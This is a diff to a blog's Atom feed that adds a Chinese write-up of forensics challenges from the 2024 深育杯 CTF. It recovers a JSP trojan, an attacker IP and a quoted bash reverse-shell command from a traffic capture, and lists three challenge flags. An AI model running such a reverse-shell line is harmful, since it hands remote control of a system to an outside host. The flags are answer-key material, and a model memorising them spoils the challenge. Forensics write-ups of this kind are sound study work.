@@ -8,8 +8,39 @@
     <author>
       <name>甘蔗</name>
     </author>
-    <updated>2024-11-18T03:33:35.963Z</updated>
+    <updated>2024-11-22T16:00:00.000Z</updated>
     <category term="Hacker" />
+    <entry>
+        <id>http://example.com/2024/11/23/%E7%BA%BF%E4%B8%8A%E8%B5%9B/%E6%B7%B1%E8%82%B2%E6%9D%AF2024/</id>
+        <title>深育杯2024</title>
+        <link rel="alternate" href="http://example.com/2024/11/23/%E7%BA%BF%E4%B8%8A%E8%B5%9B/%E6%B7%B1%E8%82%B2%E6%9D%AF2024/"/>
+        <content type="html">&lt;h1 id=&#34;2024深育杯&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2024深育杯&#34;&gt;#&lt;/a&gt; 2024 深育杯&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;本次比赛也是取证题做爽了，可惜就搞出来几题...&lt;br /&gt;
+ 搬运的群友和官方 WP (部分)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;pwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn&#34;&gt;#&lt;/a&gt; PWN&lt;/h2&gt;
+&lt;p&gt;流量包 20662 发现一个 zip，解压出来一个 jsp 文件，是一个木马&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/ftgsvr88&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/vTGmGRfw/QQ20241130-113720.png&#34; alt=&#34;QQ20241130-113720.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/WthT4s4C&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/VsF6D6Pf/QQ20241130-113802.png&#34; alt=&#34;QQ20241130-113802.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+ 得到：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;192.168.233.1+userLogin.jsp+2024-11-13 23:53&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;PWN1：flag&amp;#123;3018ec0e9ca0fb52d0a43836cc727b59&amp;#125;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://postimg.cc/JtBvg00r&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/RCPmWnzH/QQ20241130-114040.png&#34; alt=&#34;QQ20241130-114040.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/Zvk7ZPnT&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/j22GHZrJ/QQ20241130-114203.png&#34; alt=&#34;QQ20241130-114203.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+ 得到：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.233.133/8888 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;PWN2：flag&amp;#123;7d5a0e505b4fd47553a29872cd140dc2&amp;#125;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;这里注意别找错了：&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/JshQfYxN&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/JzNdB9B2/QQ20241130-114345.png&#34; alt=&#34;QQ20241130-114345.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/Hcb0wqWg&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/63mHXKDy/QQ20241130-114447.png&#34; alt=&#34;QQ20241130-114447.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+ 官方 WP 说对流量包的返回结果挨个分析也可以找到：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;PWN3：flag&amp;#123;sh3n7u3bei@2024welcome&amp;#125;&lt;/code&gt;&lt;/p&gt;
+</content>
+        <category term="线上赛" scheme="http://example.com/categories/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" />
+        <category term="线上赛" scheme="http://example.com/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" />
+        <updated>2024-11-22T16:00:00.000Z</updated>
+    </entry>
     <entry>
         <id>http://example.com/2024/11/18/hgame%E6%AF%94%E8%B5%9B/hgame2024-week2/</id>
         <title>hgame比赛-week2</title>
